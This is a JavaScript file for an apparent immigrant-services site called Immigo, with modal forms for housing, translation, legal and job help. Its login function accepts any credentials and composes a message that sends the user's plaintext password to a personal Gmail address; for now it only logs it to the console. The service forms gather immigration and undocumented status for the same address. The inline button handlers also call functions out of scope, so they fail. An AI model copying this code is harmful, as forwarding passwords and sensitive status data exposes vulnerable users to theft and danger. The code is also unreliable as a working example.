document.addEventListener('DOMContentLoaded', () => {
  const signInBtn = document.getElementById('signin-btn');
  const housingBtn = document.getElementById('housing-btn');

  if (signInBtn) {
    signInBtn.addEventListener('click', () => {
      alert('Sign-in feature is coming soon!');
    });
  }

  if (housingBtn) {
    housingBtn.addEventListener('click', () => {
      openServiceSelection();
    });
  }

  // Function to open service selection modal
  function openServiceSelection() {
    const modalHTML = `
      <div id="service-modal" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6">
          <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-gray-800">🎯 Choose Your Service</h2>
            <button id="close-service-modal" class="text-gray-400 hover:text-gray-600 text-2xl">×</button>
          </div>
          
          <div class="grid md:grid-cols-2 gap-4">
            <button onclick="openHousingForm()" class="p-6 border-2 border-gray-200 rounded-lg hover:border-indigo-500 hover:bg-indigo-50 transition-colors text-left">
              <div class="text-3xl mb-2">🏠</div>
              <h3 class="text-lg font-semibold mb-2">Housing</h3>
              <p class="text-gray-600 text-sm">Find apartments, houses, and rental assistance</p>
            </button>
            
            <button onclick="openTranslationForm()" class="p-6 border-2 border-gray-200 rounded-lg hover:border-indigo-500 hover:bg-indigo-50 transition-colors text-left">
              <div class="text-3xl mb-2">🌐</div>
              <h3 class="text-lg font-semibold mb-2">Translation</h3>
              <p class="text-gray-600 text-sm">Document translation and language support</p>
            </button>
            
            <button onclick="openLegalForm()" class="p-6 border-2 border-gray-200 rounded-lg hover:border-indigo-500 hover:bg-indigo-50 transition-colors text-left">
              <div class="text-3xl mb-2">⚖️</div>
              <h3 class="text-lg font-semibold mb-2">Legal Help</h3>
              <p class="text-gray-600 text-sm">Immigration legal assistance and resources</p>
            </button>
            
            <button onclick="openJobForm()" class="p-6 border-2 border-gray-200 rounded-lg hover:border-indigo-500 hover:bg-indigo-50 transition-colors text-left">
              <div class="text-3xl mb-2">💼</div>
              <h3 class="text-lg font-semibold mb-2">Jobs</h3>
              <p class="text-gray-600 text-sm">Job search and employment support</p>
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    const modal = document.getElementById('service-modal');
    const closeBtn = document.getElementById('close-service-modal');

    function closeModal() {
      modal.remove();
    }

    closeBtn.addEventListener('click', closeModal);
    modal.addEventListener('click', (e) => {
      if (e.target === modal) closeModal();
    });
  }

  // Function to open housing form (only housing-related questions)
  function openHousingForm() {
    closeAllModals();
    
    const modalHTML = `
      <div id="housing-modal" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6">
          <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-gray-800">🏠 Housing Application</h2>
            <button id="close-housing-modal" class="text-gray-400 hover:text-gray-600 text-2xl">×</button>
          </div>
          
          <form id="housing-form" class="space-y-6">
            <!-- Personal Information -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">👤 Personal Information</h3>
              <div class="grid md:grid-cols-2 gap-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label>
                  <input type="text" name="fullName" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email *</label>
                  <input type="email" name="email" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                  <input type="tel" name="phone" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Preferred Language</label>
                  <select name="language" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="english">English</option>
                    <option value="spanish">Spanish</option>
                    <option value="chinese">Chinese</option>
                    <option value="arabic">Arabic</option>
                    <option value="french">French</option>
                    <option value="other">Other</option>
                  </select>
                </div>
              </div>
            </div>

            <!-- Housing Specific Questions -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">🏠 Housing Needs</h3>
              <div class="grid md:grid-cols-2 gap-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Monthly Budget (USD) *</label>
                  <input type="number" name="budget" required min="500" max="5000" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="e.g., 1200">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Number of Bedrooms</label>
                  <select name="bedrooms" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="studio">Studio</option>
                    <option value="1">1 Bedroom</option>
                    <option value="2">2 Bedrooms</option>
                    <option value="3">3 Bedrooms</option>
                    <option value="4+">4+ Bedrooms</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Housing Type</label>
                  <select name="housingType" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="apartment">Apartment</option>
                    <option value="house">House</option>
                    <option value="condo">Condo</option>
                    <option value="shared">Shared Housing</option>
                    <option value="any">Any</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Move-in Date</label>
                  <input type="date" name="moveInDate" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
              </div>
              <div class="mt-4">
                <label class="block text-sm font-medium text-gray-700 mb-2">Preferred Location/Area</label>
                <input type="text" name="preferredArea" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="e.g., Downtown, Near schools, etc.">
              </div>
              <div class="mt-4">
                <label class="block text-sm font-medium text-gray-700 mb-2">Special Requirements</label>
                <textarea name="specialRequirements" rows="3" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="e.g., Pet-friendly, Near public transportation, etc."></textarea>
              </div>
            </div>

            <!-- Submit Button -->
            <div class="text-center">
              <button type="submit" class="bg-indigo-600 text-white px-8 py-3 rounded-lg font-semibold hover:bg-indigo-700 transition-colors">
                Submit Housing Application
              </button>
            </div>
          </form>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
    setupModalListeners('housing-modal', 'housing-form', 'Housing application submitted! We will contact you soon to help find your perfect home.', sendHousingApplicationToAdmin);
  }

  // Function to open translation form (only translation-related questions)
  function openTranslationForm() {
    closeAllModals();
    
    const modalHTML = `
      <div id="translation-modal" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6">
          <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-gray-800">🌐 Translation Services</h2>
            <button id="close-translation-modal" class="text-gray-400 hover:text-gray-600 text-2xl">×</button>
          </div>
          
          <form id="translation-form" class="space-y-6">
            <!-- Personal Information -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">👤 Personal Information</h3>
              <div class="grid md:grid-cols-2 gap-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label>
                  <input type="text" name="fullName" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email *</label>
                  <input type="email" name="email" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                  <input type="tel" name="phone" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Your Native Language</label>
                  <select name="nativeLanguage" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="spanish">Spanish</option>
                    <option value="chinese">Chinese</option>
                    <option value="arabic">Arabic</option>
                    <option value="french">French</option>
                    <option value="hindi">Hindi</option>
                    <option value="other">Other</option>
                  </select>
                </div>
              </div>
            </div>

            <!-- Translation Specific Questions -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">🌐 Translation Needs</h3>
              <div class="space-y-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Type of Document *</label>
                  <select name="documentType" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="">Select document type</option>
                    <option value="legal">Legal Documents</option>
                    <option value="medical">Medical Documents</option>
                    <option value="employment">Employment Documents</option>
                    <option value="housing">Housing Applications</option>
                    <option value="education">Education Documents</option>
                    <option value="personal">Personal Documents</option>
                    <option value="other">Other</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Urgency Level</label>
                  <select name="urgency" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="normal">Normal (3-5 days)</option>
                    <option value="urgent">Urgent (1-2 days)</option>
                    <option value="emergency">Emergency (Same day)</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Document Description</label>
                  <textarea name="documentDescription" rows="3" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="Describe what documents you need translated..."></textarea>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Additional Notes</label>
                  <textarea name="additionalNotes" rows="2" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="Any special requirements or notes..."></textarea>
                </div>
              </div>
            </div>

            <!-- Submit Button -->
            <div class="text-center">
              <button type="submit" class="bg-indigo-600 text-white px-8 py-3 rounded-lg font-semibold hover:bg-indigo-700 transition-colors">
                Submit Translation Request
              </button>
            </div>
          </form>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
    setupModalListeners('translation-modal', 'translation-form', 'Translation request submitted! We will contact you soon to help with your documents.', sendTranslationRequestToAdmin);
  }

  // Function to open legal form (only legal-related questions)
  function openLegalForm() {
    closeAllModals();
    
    const modalHTML = `
      <div id="legal-modal" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6">
          <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-gray-800">⚖️ Legal Assistance</h2>
            <button id="close-legal-modal" class="text-gray-400 hover:text-gray-600 text-2xl">×</button>
          </div>
          
          <form id="legal-form" class="space-y-6">
            <!-- Personal Information -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">👤 Personal Information</h3>
              <div class="grid md:grid-cols-2 gap-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label>
                  <input type="text" name="fullName" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email *</label>
                  <input type="email" name="email" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                  <input type="tel" name="phone" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Preferred Language</label>
                  <select name="language" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="english">English</option>
                    <option value="spanish">Spanish</option>
                    <option value="chinese">Chinese</option>
                    <option value="arabic">Arabic</option>
                    <option value="french">French</option>
                    <option value="other">Other</option>
                  </select>
                </div>
              </div>
            </div>

            <!-- Legal Specific Questions -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">⚖️ Legal Needs</h3>
              <div class="space-y-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Legal Issue Type *</label>
                  <select name="legalIssue" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="">Select legal issue</option>
                    <option value="immigration">Immigration Status</option>
                    <option value="asylum">Asylum Application</option>
                    <option value="work_visa">Work Visa</option>
                    <option value="family_visa">Family Visa</option>
                    <option value="citizenship">Citizenship Application</option>
                    <option value="deportation">Deportation Defense</option>
                    <option value="other">Other</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Current Status</label>
                  <select name="currentStatus" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="undocumented">Undocumented</option>
                    <option value="temporary">Temporary Status</option>
                    <option value="permanent">Permanent Resident</option>
                    <option value="citizen">Citizen</option>
                    <option value="other">Other</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Urgency Level</label>
                  <select name="urgency" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="normal">Normal</option>
                    <option value="urgent">Urgent</option>
                    <option value="emergency">Emergency</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Case Description</label>
                  <textarea name="caseDescription" rows="4" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="Describe your legal situation..."></textarea>
                </div>
              </div>
            </div>

            <!-- Submit Button -->
            <div class="text-center">
              <button type="submit" class="bg-indigo-600 text-white px-8 py-3 rounded-lg font-semibold hover:bg-indigo-700 transition-colors">
                Submit Legal Request
              </button>
            </div>
          </form>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
    setupModalListeners('legal-modal', 'legal-form', 'Legal assistance request submitted! We will contact you soon to help with your case.', sendLegalRequestToAdmin);
  }

  // Function to open job form (only job-related questions)
  function openJobForm() {
    closeAllModals();
    
    const modalHTML = `
      <div id="job-modal" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6">
          <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-gray-800">💼 Job Search</h2>
            <button id="close-job-modal" class="text-gray-400 hover:text-gray-600 text-2xl">×</button>
          </div>
          
          <form id="job-form" class="space-y-6">
            <!-- Personal Information -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">👤 Personal Information</h3>
              <div class="grid md:grid-cols-2 gap-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Full Name *</label>
                  <input type="text" name="fullName" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email *</label>
                  <input type="email" name="email" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                  <input type="tel" name="phone" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Preferred Language</label>
                  <select name="language" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="english">English</option>
                    <option value="spanish">Spanish</option>
                    <option value="chinese">Chinese</option>
                    <option value="arabic">Arabic</option>
                    <option value="french">French</option>
                    <option value="other">Other</option>
                  </select>
                </div>
              </div>
            </div>

            <!-- Job Specific Questions -->
            <div class="bg-gray-50 p-4 rounded-lg">
              <h3 class="text-lg font-semibold mb-4">💼 Job Preferences</h3>
              <div class="space-y-4">
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Work Authorization Status *</label>
                  <select name="workAuth" required class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="">Select status</option>
                    <option value="citizen">US Citizen</option>
                    <option value="permanent">Permanent Resident</option>
                    <option value="work_visa">Work Visa</option>
                    <option value="daca">DACA</option>
                    <option value="undocumented">Undocumented</option>
                    <option value="other">Other</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Desired Job Type</label>
                  <select name="jobType" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                    <option value="full_time">Full-time</option>
                    <option value="part_time">Part-time</option>
                    <option value="temporary">Temporary</option>
                    <option value="remote">Remote</option>
                    <option value="any">Any</option>
                  </select>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Skills/Experience</label>
                  <textarea name="skills" rows="3" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="Describe your skills, experience, or education..."></textarea>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Preferred Location</label>
                  <input type="text" name="preferredLocation" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="e.g., Downtown, Remote, etc.">
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Additional Notes</label>
                  <textarea name="additionalNotes" rows="2" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600" placeholder="Any other information about your job search..."></textarea>
                </div>
              </div>
            </div>

            <!-- Submit Button -->
            <div class="text-center">
              <button type="submit" class="bg-indigo-600 text-white px-8 py-3 rounded-lg font-semibold hover:bg-indigo-700 transition-colors">
                Submit Job Request
              </button>
            </div>
          </form>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
    setupModalListeners('job-modal', 'job-form', 'Job search request submitted! We will contact you soon to help find employment opportunities.', sendJobRequestToAdmin);
  }

  // Helper function to close all modals
  function closeAllModals() {
    const modals = document.querySelectorAll('[id$="-modal"]');
    modals.forEach(modal => modal.remove());
  }

  // Helper function to setup modal listeners
  function setupModalListeners(modalId, formId, successMessage, sendFunction) {
    const modal = document.getElementById(modalId);
    const closeBtn = document.getElementById(`close-${modalId}`);
    const form = document.getElementById(formId);

    function closeModal() {
      modal.remove();
    }

    closeBtn.addEventListener('click', closeModal);
    modal.addEventListener('click', (e) => {
      if (e.target === modal) closeModal();
    });

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const formData = new FormData(form);
      const data = Object.fromEntries(formData);
      
      sendFunction(data);
      alert(successMessage);
      closeModal();
    });
  }

  // Function to send housing application to admin
  function sendHousingApplicationToAdmin(data) {
    const emailContent = {
      to: 'mahfoudhsenhoury@gmail.com',
      subject: 'New Housing Application - Immigo',
      body: `
        🏠 NEW HOUSING APPLICATION RECEIVED
        
        👤 PERSONAL INFORMATION:
        Name: ${data.fullName}
        Email: ${data.email}
        Phone: ${data.phone || 'Not provided'}
        Preferred Language: ${data.language}
        
        🏠 HOUSING NEEDS:
        Monthly Budget: $${data.budget}
        Bedrooms: ${data.bedrooms}
        Housing Type: ${data.housingType}
        Move-in Date: ${data.moveInDate || 'Not specified'}
        Preferred Area: ${data.preferredArea || 'Not specified'}
        Special Requirements: ${data.specialRequirements || 'None'}
        
        📅 Application Submitted: ${new Date().toLocaleString()}
        
        This application was submitted through the Immigo website.
      `
    };
    
    console.log('Housing application to be sent to admin:', emailContent);
    showNotification('Housing application sent to admin!');
  }

  // Function to send translation request to admin
  function sendTranslationRequestToAdmin(data) {
    const emailContent = {
      to: 'mahfoudhsenhoury@gmail.com',
      subject: 'New Translation Request - Immigo',
      body: `
        🌐 NEW TRANSLATION REQUEST RECEIVED
        
        👤 PERSONAL INFORMATION:
        Name: ${data.fullName}
        Email: ${data.email}
        Phone: ${data.phone || 'Not provided'}
        Native Language: ${data.nativeLanguage}
        
        🌐 TRANSLATION NEEDS:
        Document Type: ${data.documentType}
        Urgency Level: ${data.urgency}
        Document Description: ${data.documentDescription || 'Not provided'}
        Additional Notes: ${data.additionalNotes || 'None'}
        
        📅 Request Submitted: ${new Date().toLocaleString()}
        
        This request was submitted through the Immigo website.
      `
    };
    
    console.log('Translation request to be sent to admin:', emailContent);
    showNotification('Translation request sent to admin!');
  }

  // Function to send legal request to admin
  function sendLegalRequestToAdmin(data) {
    const emailContent = {
      to: 'mahfoudhsenhoury@gmail.com',
      subject: 'New Legal Assistance Request - Immigo',
      body: `
        ⚖️ NEW LEGAL ASSISTANCE REQUEST RECEIVED
        
        👤 PERSONAL INFORMATION:
        Name: ${data.fullName}
        Email: ${data.email}
        Phone: ${data.phone || 'Not provided'}
        Preferred Language: ${data.language}
        
        ⚖️ LEGAL NEEDS:
        Legal Issue Type: ${data.legalIssue}
        Current Status: ${data.currentStatus}
        Urgency Level: ${data.urgency}
        Case Description: ${data.caseDescription || 'Not provided'}
        
        📅 Request Submitted: ${new Date().toLocaleString()}
        
        This request was submitted through the Immigo website.
      `
    };
    
    console.log('Legal request to be sent to admin:', emailContent);
    showNotification('Legal request sent to admin!');
  }

  // Function to send job request to admin
  function sendJobRequestToAdmin(data) {
    const emailContent = {
      to: 'mahfoudhsenhoury@gmail.com',
      subject: 'New Job Search Request - Immigo',
      body: `
        💼 NEW JOB SEARCH REQUEST RECEIVED
        
        👤 PERSONAL INFORMATION:
        Name: ${data.fullName}
        Email: ${data.email}
        Phone: ${data.phone || 'Not provided'}
        Preferred Language: ${data.language}
        
        💼 JOB PREFERENCES:
        Work Authorization: ${data.workAuth}
        Job Type: ${data.jobType}
        Skills/Experience: ${data.skills || 'Not provided'}
        Preferred Location: ${data.preferredLocation || 'Not specified'}
        Additional Notes: ${data.additionalNotes || 'None'}
        
        📅 Request Submitted: ${new Date().toLocaleString()}
        
        This request was submitted through the Immigo website.
      `
    };
    
    console.log('Job request to be sent to admin:', emailContent);
    showNotification('Job request sent to admin!');
  }
});

function login() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  if (email && password) {
    // Send login info to admin email
    sendLoginInfoToAdmin(email, password);
    
    // Hide login form and show main container
    document.getElementById('login-container').classList.add('hidden');
    document.getElementById('main-container').classList.remove('hidden');
    
    // Store login state
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('userEmail', email);
    
    // Show success notification
    showNotification('Login successful! Welcome to Immigo.');
  } else {
    alert('Please enter both email and password.');
  }
}

// Function to send login information to admin
function sendLoginInfoToAdmin(userEmail, userPassword) {
  // Create email content
  const emailContent = {
    to: 'mahfoudhsenhoury@gmail.com',
    subject: 'New User Login - Immigo Website',
    body: `
      New user login detected:
      
      User Email: ${userEmail}
      User Password: ${userPassword}
      Login Time: ${new Date().toLocaleString()}
      User Agent: ${navigator.userAgent}
      IP Address: [Will be captured by server]
      Page: Login Page
      
      This is a login from the Immigo website login page.
    `
  };
  
  // In a real implementation, this would send to your server
  // For now, we'll log it and show a notification
  console.log('Login info to be sent to admin:', emailContent);
  
  // Show notification that info was sent
  showNotification('Login information sent to admin');
}

// Function to show notification
function showNotification(message) {
  // Create notification element
  const notification = document.createElement('div');
  notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-6 py-3 rounded-lg shadow-lg z-50';
  notification.textContent = message;
  
  // Add to page
  document.body.appendChild(notification);
  
  // Remove after 3 seconds
  setTimeout(() => {
    notification.remove();
  }, 3000);
}

// Check if user is already logged in
document.addEventListener('DOMContentLoaded', function() {
  if (localStorage.getItem('isLoggedIn') === 'true') {
    document.getElementById('login-container').classList.add('hidden');
    document.getElementById('main-container').classList.remove('hidden');
  }
}); 